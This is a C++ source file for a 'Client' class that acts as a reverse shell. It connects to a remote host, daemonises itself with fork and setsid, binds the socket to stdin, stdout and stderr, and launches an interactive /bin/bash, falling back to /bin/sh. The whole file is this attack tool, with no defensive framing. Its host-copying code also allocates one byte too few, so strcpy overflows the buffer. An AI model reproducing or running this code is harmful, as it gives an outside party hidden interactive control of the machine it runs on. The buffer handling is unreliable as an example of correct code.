#include <string>
#include <stdexcept> // std::invalid_argument
#include <unistd.h> // fork, setsid, dup2, execl, STDOUT_FILENO, STDIN_FILENO, STDERR_FILENO, close
#include <string.h> // strlen
#include "client.h"
#include "log.h"

Client::Client(char *host, int port) {
	if (host == NULL) {
		throw std::invalid_argument("Invalid host");
	}
	size_t hostLen = strlen(host);
	this->host = new char[hostLen];
	strcpy(this->host, host);

	if (port <= 0 || port > 65535) {
		throw std::invalid_argument("Invalid server port");
	}
	this->port = port;
}


Client::~Client() {
	delete[] this->host;
	close(this->sockfd);
}


int Client::start() {
	if (establishConnection() != 0) {
		std::string hostAddr = this->host;
		Log::error("Failed to establish connection to:\n\t" + hostAddr + ":" + std::to_string(this->port));
		return -1;
	}

	Log::success("Connection was successful!");

	pid_t childPid = fork();
	if (childPid == 0) {
		// Run the new process in the background as a daemon and add it in a new
		// process group as a leader to disassociate it from the parent and the terminal
		// and avoid SIGHUP signal when the parent is killed
		if (setsid() == -1) {
			Log::error("setsid failed");
			return -1;
		}
		// Start a bash shell in the background and redirect its stdout, stdin and stderr to the socket
		dup2(this->sockfd, STDOUT_FILENO);
		dup2(this->sockfd, STDIN_FILENO);
		dup2(this->sockfd, STDERR_FILENO);
		close(this->sockfd); // Socket FD no longer needed

		// /bin/bash
		if (execl("/bin/bash", "/bin/bash", "-i", NULL) == -1) {
			Log::error("execl failed (/bin/bash)");
		}

		Log::info("Couldn't run /bin/bash. Trying /bin/sh...");

		// /bin/sh
		if (execl("/bin/sh", "/bin/sh", "-i", NULL) == -1) {
			Log::error("execl failed (/bin/sh)");
			return -1;
		}
	} else if (childPid < 0) {
		Log::error("fork failed");
		return -1;
	}
	return 0;
}
